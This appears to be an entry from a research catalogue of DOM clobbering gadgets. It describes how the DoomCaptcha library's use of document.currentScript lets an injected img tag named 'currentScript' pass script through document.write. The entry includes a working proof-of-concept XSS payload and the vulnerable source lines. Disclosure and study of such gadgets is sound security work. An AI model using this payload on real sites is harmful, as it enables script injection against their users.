---
description: Captchas don't have to be boring.
github: vivirenremoto/doomcaptcha
gadgets:
  Latest:
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - name-attr
      - label-attr
      - before-lib-load
    pocs:
      - description: The [DoomCaptcha](https://github.com/vivirenremoto/doomcaptcha) library uses the `document.currentScript` property to load additional scripts.
        code: |
          <!-- user input -->
          <img name="currentScript" label="<script>alert(document.domain)</script>">

          <script src="https://vivirenremoto.github.io/doomcaptcha/script.js?version=16"></script>
    links:
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/doomcaptcha.md
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/vivirenremoto/doomcaptcha/blob/c17ad670882174ce2d8a9b1d451c5ed453825f6a/script.js#L3">https://github.com/vivirenremoto/doomcaptcha/blob/c17ad670882174ce2d8a9b1d451c5ed453825f6a/script.js#L3</a>

      ```javascript
      var captcha_label = document.currentScript.getAttribute('label');

      // [...]

      var captcha_html = '';
      if (captcha_label) {
          captcha_html = '<p>' + captcha_label + '<br>';
      }

      // [...]

      document.write(captcha_html);
      ```
---
